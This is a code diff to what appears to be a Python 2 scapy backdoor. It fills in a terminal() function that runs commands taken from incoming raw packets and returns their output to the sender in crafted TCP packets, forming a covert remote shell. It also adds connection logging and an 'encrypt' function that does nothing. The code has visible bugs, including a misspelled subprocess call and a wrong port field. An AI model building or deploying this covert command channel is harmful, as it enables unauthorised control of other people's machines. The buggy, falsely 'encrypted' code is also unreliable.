@@ -20,6 +20,7 @@ import setproctitle
 import os
 import thread
 import time
+import subprocess
 
 '''
 ------------------------------------------------------------------------------
@@ -269,11 +270,15 @@ def clientCommands(packet):
 			packetFilter = packetFilter + ")"
 
 		# Beginning Packet sniffing
-		sniff(filter=packetFilter, prn=server(), timeout=300)		
+		sniff(filter=packetFilter, prn=server(), timeout=300)
+		if len(log) > 0:
+			with open(log, "a") as logFile:
+				logFile.write("Connection with " + packet[IP].src + " timeout at " + time.ctime() + "\n")
 
 	except SystemExit:
-		
-		print ""
+		if len(log) > 0:
+			with open(log, "a") as logFile:
+				logFile.write("Connection with " + packet[IP].src + " terminated at " + time.ctime() + "\n")
 
 '''
 ------------------------------------------------------------------------------
@@ -390,7 +395,14 @@ def getFile(packet):
 ---------------------------------------------------------------------------------------------
 '''
 def terminal(packet):
-	print "Do stuff"
+	output = subpricess.check_output(packet[RAW].load, stderr=subprocess.STDOUT)
+	confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
+	                TCP(sport=random.randint(0, 65535), dport=packet[TCP].src, seq=packet[TCP].seq+1)/\
+	                RAW(load=encrypt(output))
+	send(confirmPacket, verbose=0)
+	if len(log) > 0:
+		with open(log, "a") as logFile:
+			logFile.write("Results of \"" + packet[RAW].load + "\" sent to " + packet[IP].src + " at " + time.ctime() + "\n")
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -414,6 +426,29 @@ def terminal(packet):
 '''
 def notify(packet):
 	print "Do stuff"
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: encrypt
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: encrypt(message)
+--              message - The message to be encrypted or decryped
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def encrypt(message):
+	return message
 
 main()
 
